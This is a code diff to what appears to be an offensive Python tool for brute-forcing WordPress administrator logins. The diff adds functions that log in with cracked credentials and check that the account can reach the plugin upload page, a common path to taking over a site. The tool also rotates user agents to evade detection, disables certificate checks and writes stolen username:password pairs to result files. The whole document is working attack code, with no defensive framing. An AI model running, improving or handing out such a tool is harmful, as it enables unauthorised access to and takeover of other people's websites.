@@ -165,6 +165,102 @@ def verify_admin_access_sync(session, url, timeout):
     except:
         return False
 
+async def verify_plugin_installation_access(session, url, timeout):
+    """Verify admin access by actually attempting to access plugin installation page"""
+    try:
+        plugin_install_urls = [
+            f"{url}/wp-admin/plugin-install.php",
+            f"{url}/wp-admin/plugin-install.php?tab=upload",
+            f"{url}/wp-admin/plugins.php?page=plugin-install"
+        ]
+        
+        for plugin_url in plugin_install_urls:
+            try:
+                headers = {'User-Agent': get_random_user_agent()}
+                async with session.get(plugin_url, timeout=timeout, ssl=False, headers=headers, allow_redirects=False) as response:
+                    if response.status == 200:
+                        content = await response.text()
+                        content_lower = content.lower()
+                        
+                        # Check for plugin installation page indicators
+                        installation_indicators = [
+                            'plugin-install-tab',
+                            'upload-plugin',
+                            'plugin-upload-form',
+                            'install-plugin-upload',
+                            'pluginzip',
+                            'browse plugins',
+                            'add plugins'
+                        ]
+                        
+                        if any(indicator in content_lower for indicator in installation_indicators):
+                            return True, plugin_url, "Plugin installation page accessible"
+                            
+                    elif response.status in [301, 302]:
+                        location = response.headers.get('Location', '')
+                        if 'wp-login.php' in location:
+                            return False, plugin_url, "Redirected to login - no admin access"
+            except:
+                continue
+                
+        return False, None, "No plugin installation access found"
+    except:
+        return False, None, "Error checking plugin installation access"
+
+def verify_plugin_installation_access_sync(session, url, timeout):
+    """Synchronous version of plugin installation access verification"""
+    try:
+        plugin_install_urls = [
+            f"{url}/wp-admin/plugin-install.php",
+            f"{url}/wp-admin/plugin-install.php?tab=upload",
+            f"{url}/wp-admin/plugins.php?page=plugin-install"
+        ]
+        
+        for plugin_url in plugin_install_urls:
+            try:
+                headers = {'User-Agent': get_random_user_agent()}
+                response = session.get(plugin_url, timeout=timeout, verify=False, headers=headers, allow_redirects=False)
+                
+                if response.status_code == 200:
+                    content = response.text.lower()
+                    
+                    # Check for plugin installation page indicators
+                    installation_indicators = [
+                        'plugin-install-tab',
+                        'upload-plugin',
+                        'plugin-upload-form',
+                        'install-plugin-upload',
+                        'pluginzip',
+                        'browse plugins',
+                        'add plugins'
+                    ]
+                    
+                    if any(indicator in content for indicator in installation_indicators):
+                        return True, plugin_url, "Plugin installation page accessible"
+                        
+                elif response.status_code in [301, 302]:
+                    location = response.headers.get('Location', '')
+                    if 'wp-login.php' in location:
+                        return False, plugin_url, "Redirected to login - no admin access"
+            except:
+                continue
+                
+        return False, None, "No plugin installation access found"
+    except:
+        return False, None, "Error checking plugin installation access"
+
+def write_plugin_verification_result(output_file, url, username, password, method, has_access, plugin_url, access_details):
+    """Write detailed plugin verification results to file"""
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    with open(output_file, 'a') as f:
+        if has_access:
+            f.write(f"[{timestamp}] {url} - {username}:{password} - {method} - VERIFIED ADMIN ACCESS\n")
+            f.write(f"  → Plugin installation page: {plugin_url}\n")
+            f.write(f"  → Access details: {access_details}\n\n")
+        else:
+            f.write(f"[{timestamp}] {url} - {username}:{password} - {method} - FALSE POSITIVE (No admin access)\n")
+            f.write(f"  → Reason: {access_details}\n\n")
+
 def get_random_user_agent():
     """Return a random user agent from the list"""
     return random.choice(USER_AGENTS)
@@ -554,12 +650,46 @@ async def async_fast_admin_bruteforce(url, timeout, workers, verbose, output_fil
             try:
                 result, method = await task
                 if result:
-                    credential = f"{username}:{password}"
-                    successful_logins.append(credential)
-                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method}", "success")
-                    
-                    # Write to file immediately
-                    write_default_bruteforce_success(output_file, url, username, password, method)
+                    # Double-check plugin installation access
+                    connector = aiohttp.TCPConnector(ssl=False)
+                    async with aiohttp.ClientSession(connector=connector) as verify_session:
+                        # Re-login to get session for verification
+                        login_url = f"{url}/wp-login.php"
+                        login_data = {
+                            'log': username.strip(),
+                            'pwd': password,
+                            'wp-submit': 'Log In',
+                            'testcookie': '1'
+                        }
+                        headers = {
+                            'User-Agent': get_random_user_agent(),
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                        
+                        try:
+                            async with verify_session.post(login_url, data=login_data, headers=headers, timeout=timeout, ssl=False) as login_response:
+                                # Now verify plugin installation access
+                                has_plugin_access, plugin_url, access_details = await verify_plugin_installation_access(verify_session, url, timeout)
+                                
+                                if has_plugin_access:
+                                    credential = f"{username}:{password}"
+                                    successful_logins.append(credential)
+                                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method} - PLUGIN ACCESS VERIFIED", "success")
+                                    
+                                    # Write verified success to file
+                                    write_default_bruteforce_success(output_file, url, username, password, method)
+                                    
+                                    # Write detailed plugin verification
+                                    plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
+                                    write_plugin_verification_result(plugin_log_file, url, username, password, method, True, plugin_url, access_details)
+                                else:
+                                    print_status(f"✗ FALSE POSITIVE: {url} - {username}:{password} - Method: {method} - No plugin installation access", "warning")
+                                    
+                                    # Log false positive
+                                    plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
+                                    write_plugin_verification_result(plugin_log_file, url, username, password, method, False, plugin_url, access_details)
+                        except:
+                            print_status(f"✗ VERIFICATION FAILED: {url} - {username}:{password} - Method: {method}", "error")
                     
                     # Cancel remaining tasks since we found valid credentials
                     for remaining_task, _ in login_tasks:
@@ -605,12 +735,45 @@ def fast_admin_bruteforce(url, timeout, workers, verbose, output_file, delay=0):
             try:
                 result, method = future.result()
                 if result:
-                    credential = f"{username}:{password}"
-                    successful_logins.append(credential)
-                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method}", "success")
+                    # Double-check plugin installation access
+                    verify_session = requests.Session()
+                    login_url = f"{url}/wp-login.php"
+                    login_data = {
+                        'log': username.strip(),
+                        'pwd': password,
+                        'wp-submit': 'Log In',
+                        'testcookie': '1'
+                    }
+                    headers = {
+                        'User-Agent': get_random_user_agent(),
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
                     
-                    # Write to file immediately
-                    write_default_bruteforce_success(output_file, url, username, password, method)
+                    try:
+                        login_response = verify_session.post(login_url, data=login_data, headers=headers, timeout=timeout, verify=False)
+                        
+                        # Now verify plugin installation access
+                        has_plugin_access, plugin_url, access_details = verify_plugin_installation_access_sync(verify_session, url, timeout)
+                        
+                        if has_plugin_access:
+                            credential = f"{username}:{password}"
+                            successful_logins.append(credential)
+                            print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method} - PLUGIN ACCESS VERIFIED", "success")
+                            
+                            # Write verified success to file
+                            write_default_bruteforce_success(output_file, url, username, password, method)
+                            
+                            # Write detailed plugin verification
+                            plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
+                            write_plugin_verification_result(plugin_log_file, url, username, password, method, True, plugin_url, access_details)
+                        else:
+                            print_status(f"✗ FALSE POSITIVE: {url} - {username}:{password} - Method: {method} - No plugin installation access", "warning")
+                            
+                            # Log false positive
+                            plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
+                            write_plugin_verification_result(plugin_log_file, url, username, password, method, False, plugin_url, access_details)
+                    except:
+                        print_status(f"✗ VERIFICATION FAILED: {url} - {username}:{password} - Method: {method}", "error")
                     
                     # Cancel remaining futures since we found valid credentials
                     for f in futures:
@@ -1327,14 +1490,16 @@ async def async_try_login(url, login_path, username, password, timeout, session)
             ]
             
             if any(indicator in content_lower for indicator in success_indicators):
-                # Additional verification - check admin access
-                return await verify_admin_access(session, url, timeout)
+                # Additional verification - check plugin installation access
+                has_access, plugin_url, details = await verify_plugin_installation_access(session, url, timeout)
+                return has_access
                 
             # Check cookies as fallback
             cookie_header = response.headers.get('Set-Cookie', '')
             if 'wordpress_logged_in' in cookie_header:
-                # Verify admin access even with cookies
-                return await verify_admin_access(session, url, timeout)
+                # Verify plugin installation access even with cookies
+                has_access, plugin_url, details = await verify_plugin_installation_access(session, url, timeout)
+                return has_access
                 
     except Exception:
         pass
@@ -1398,14 +1563,16 @@ def try_login(url, login_path, username, password, timeout, delay=0):
         ]
         
         if any(indicator in content for indicator in success_indicators):
-            # Additional verification - check admin access
-            return verify_admin_access_sync(session, url, timeout)
+            # Additional verification - check plugin installation access
+            has_access, plugin_url, details = verify_plugin_installation_access_sync(session, url, timeout)
+            return has_access
             
         # Check cookies as fallback
         cookie_header = response.headers.get('Set-Cookie', '')
         if 'wordpress_logged_in' in cookie_header or any(cookie.name.startswith('wordpress_logged_in') for cookie in session.cookies):
-            # Verify admin access even with cookies
-            return verify_admin_access_sync(session, url, timeout)
+            # Verify plugin installation access even with cookies
+            has_access, plugin_url, details = verify_plugin_installation_access_sync(session, url, timeout)
+            return has_access
 
         return False
 
